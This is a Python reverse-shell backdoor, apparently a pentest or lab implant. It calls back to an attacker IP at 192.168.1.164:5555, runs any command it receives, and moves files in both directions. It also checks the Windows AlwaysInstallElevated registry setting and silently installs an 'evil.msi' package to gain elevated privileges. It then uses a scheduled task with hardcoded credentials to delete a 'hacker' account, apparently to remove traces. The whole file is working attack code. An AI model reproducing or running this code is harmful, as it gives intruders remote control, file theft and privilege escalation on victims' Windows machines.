import socket
import time
import subprocess
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        try:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        s.settimeout(None)

def check_always_install_elevated():
    cmd = (
        'reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & '
        'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
    )
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    result = result.decode(errors='ignore')
    enabled = result.count('0x1')
    if enabled >= 2:
        reliable_send("[+] AIE is ENABLED\n" + result)
    else:
        reliable_send("[-] AIE is DISABLED\n" + result)

def run_evil_msi():
    try:
        subprocess.call("msiexec /quiet /qn /i evil.msi", shell=True)
        reliable_send("[+] evil.msi executed successfully.")
    except Exception as e:
        reliable_send(f"[-] Execution failed: {str(e)}")

def delete_hacker_user():
    try:
        command = 'schtasks /create /tn deleteHacker /tr "cmd.exe /c net user hacker /del" /sc once /st 00:00 /ru hacker /rp Pass1234 /f'
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        command = 'schtasks /run /tn deleteHacker'
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        reliable_send(result.decode())
    except Exception as e:
        reliable_send(f"[-] Failed to delete user: {str(e)}")

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command == 'check_aie':
            check_always_install_elevated()
        elif command == 'run_evil_msi':
            run_evil_msi()
        elif command == 'delete_hacker_user':
            delete_hacker_user()
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.164', 5555))  # Replace with attacker's IP
            shell()
            s.close()
            break
        except:
            continue

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
